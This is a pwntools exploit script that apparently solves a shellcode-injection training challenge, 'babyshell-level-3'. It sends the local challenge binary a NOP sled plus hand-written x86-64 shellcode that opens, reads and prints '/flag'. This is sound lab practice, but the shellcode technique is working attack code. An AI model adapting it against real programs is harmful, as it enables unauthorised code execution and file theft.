import pwn
pwn.context.arch='AMD64'
chall = "/challenge/babyshell-level-3"
r = pwn.process(chall)
nopslide=pwn.asm("nop")*850 

shellcode=pwn.asm(f""" 
xor rax,rax
mov eax,0x67616c66 
shl rax,8
mov al,0x2f
push rax
mov rdi,rsp
xor rax,rax
mov al, 2
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
xor rax, rax
mov rsi, rsp
mov dl,128
syscall
xor rax,rax
mov al, 1
xor rdi,rdi
inc rdi
syscall
xor rax,rax
mov al, 60
xor rdi, rdi
syscall

""")
payload = nopslide + shellcode
r.send(payload)
r.interactive(0)
r.clean()